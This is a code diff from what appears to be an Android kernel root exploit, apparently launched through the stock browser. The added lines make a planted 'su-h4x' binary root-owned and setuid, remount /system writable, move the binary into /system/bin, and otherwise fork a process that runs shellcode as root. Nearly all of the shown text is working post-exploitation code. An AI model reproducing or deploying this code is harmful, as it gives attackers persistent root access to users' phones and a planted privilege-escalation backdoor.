@@ -688,12 +688,52 @@ void hack_the_kernel(int signum) {
 
                 //////////// ROOT CODE HERE /////////////////
 
+                int res;
+
+                #define TMP_SU_H4X "/data/data/com.android.browser/cache/su-h4x"
+                #define SYSTEM_SU_H4X "/system/bin/su-h4x"
+                #define MOUNT_OPTS "user_xattr,barrier=1,data=ordered"
+
+
+                #ifdef CHMODSU
+                LOGD("[ROOT] calling chmod 1\n");
+                res = chmod(TMP_SU_H4X, 0777);
+                LOGD("[ROOT] chmod 1 res = %d\n", res);
+                if (!res) {
+                    LOGD("[ROOT] calling chown\n");
+                    res = chown(TMP_SU_H4X, 0, 0);
+                    LOGD("[ROOT] chown res = %d\n", res);
+                    if (!res) {
+                        LOGD("[ROOT] calling chmod 2\n");
+                        res = chmod(TMP_SU_H4X, 06777);
+                        LOGD("[ROOT] chmod 2 res = %d\n", res);
+                    }
+                }
+                #endif
+
+                #ifdef MVSU
+                LOGD("[ROOT] calling mount 1\n");
+                res = mount(NULL, "/system", NULL, MS_REMOUNT, MOUNT_OPTS);
+                LOGD("[ROOT] mount 1 res = %d\n", res);
+                if (!res) {
+                    LOGD("[ROOT] calling rename\n");
+                    res = rename(TMP_SU_H4X, SYSTEM_SU_H4X);
+                    LOGD("[ROOT] rename res = %d\n", res);
+                    LOGD("[ROOT] errno = %d '%s'\n", errno, strerror(errno));
+                    LOGD("[ROOT] calling mount 2\n");
+                    res = mount(NULL, "/system", NULL, MS_RDONLY|MS_REMOUNT, MOUNT_OPTS);
+                    LOGD("[ROOT] mount 2 res = %d\n", res);
+                }
+                #endif
+
+                #if !defined(CHMODSU) && !defined(MVSU)
                 // Fork and install the root shell
                 if(fork() == 0) {
                     LOGD("running as pid %d, tid %d, with uid %d", getpid(), gettid(), getuid());
                     run_shellcode_as_root();
                     exit(0);
                 }
+                #endif
 
                 //////////////////////////////////////////////
                 sleep(3);
